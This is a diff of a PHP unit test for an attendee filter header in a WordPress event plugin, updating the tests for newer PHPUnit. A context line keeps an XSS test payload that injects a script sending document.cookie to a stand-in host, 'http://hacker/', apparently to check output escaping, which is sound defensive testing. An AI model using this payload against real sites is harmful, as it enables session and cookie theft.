@@ -31,8 +31,9 @@ class AttendeeFilterHeaderTest extends TestCase
     private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';
 
 
-    public static function setUpBeforeClass()
+    public static function setUpBeforeClass(): void
     {
+        parent::setUpBeforeClass();
         require_once EE_ADMIN . 'EE_Admin_Page.core.php';
         if (! defined('REG_ADMIN_URL')) {
             define('REG_ADMIN_URL', admin_url('admin.php?page=espresso_registrations'));
@@ -49,8 +50,9 @@ class AttendeeFilterHeaderTest extends TestCase
      * @throws ReflectionException
      * @since 4.10.2.p
      */
-    public function setUp()
+    public function setUp(): void
     {
+        parent::setUp();
         $this->setUpAttendee();
     }
 
@@ -70,8 +72,7 @@ class AttendeeFilterHeaderTest extends TestCase
             'ATT_lname' => 'Rogers',
             'ATT_email' => 'shaggy@mysterymachine.com'
         ]);
-        $saved = $this->attendee->save();
-        $this->assertTrue($saved > 0);
+        $this->assertTrue($this->attendee->save() > 0);
     }
 
 
@@ -84,7 +85,7 @@ class AttendeeFilterHeaderTest extends TestCase
      * @throws InvalidArgumentException
      * @since 4.10.2.p
      */
-    private function getAttendeeFilterHeader(array $get_params)
+    private function getAttendeeFilterHeader(array $get_params): AttendeeFilterHeader
     {
         return new AttendeeFilterHeader(
             new RequestMock($get_params, [], [], [], []),
@@ -111,7 +112,7 @@ class AttendeeFilterHeaderTest extends TestCase
      * @throws ReflectionException
      * @since  4.10.2.p
      */
-    public function testDataGenerator()
+    public function testDataGenerator(): Generator
     {
         $ID = $this->attendee->ID();
         $site_admin_url = admin_url();
@@ -166,7 +167,7 @@ class AttendeeFilterHeaderTest extends TestCase
      */
     public function testGetHeaderText()
     {
-        foreach ($this->testDataGenerator() as list($get_params, $expected)) {
+        foreach ($this->testDataGenerator() as [$get_params, $expected]) {
             $this->assertInstanceOf('EE_Attendee', $this->attendee);
             $attendee_filter_header = $this->getAttendeeFilterHeader($get_params);
             $header_text = $attendee_filter_header->getHeaderText();
